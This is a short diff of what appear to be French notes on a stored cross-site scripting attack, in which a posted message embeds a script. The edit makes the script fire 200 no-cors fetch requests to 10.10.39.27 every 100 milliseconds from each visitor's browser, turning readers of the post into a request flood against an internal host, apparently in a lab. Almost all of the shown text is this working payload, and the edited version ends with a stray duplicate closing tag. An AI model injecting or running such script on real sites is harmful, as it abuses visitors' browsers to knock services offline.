@@ -19,12 +19,12 @@
 Mon message qui va s'afficher
 <script>
 // Send 100 requests in parallel 
-const sendRequests = async (numRequests) => {
-    const url = 'http://localhost:8080';
+const sendRequests = async () => {
+    const url = 'http://10.10.39.27/';
     const requests = [];
 
-    for (let i = 0; i < numRequests; i++) {
-        requests.push(fetch(url));
+    for (let i = 0; i < 200; i++) {
+        requests.push(fetch(url, { mode: 'no-cors'}));
     }
 
     try {
@@ -36,10 +36,8 @@ const sendRequests = async (numRequests) => {
     }
 };
 // Example: Send 100 requests in parallel
-while (true) {
-    console.log('Sending requests...');
-    sendRequests(100);
-}
+setInterval(sendRequests, 100);
+</script>
 </script>
 ```
 - X envoie son post
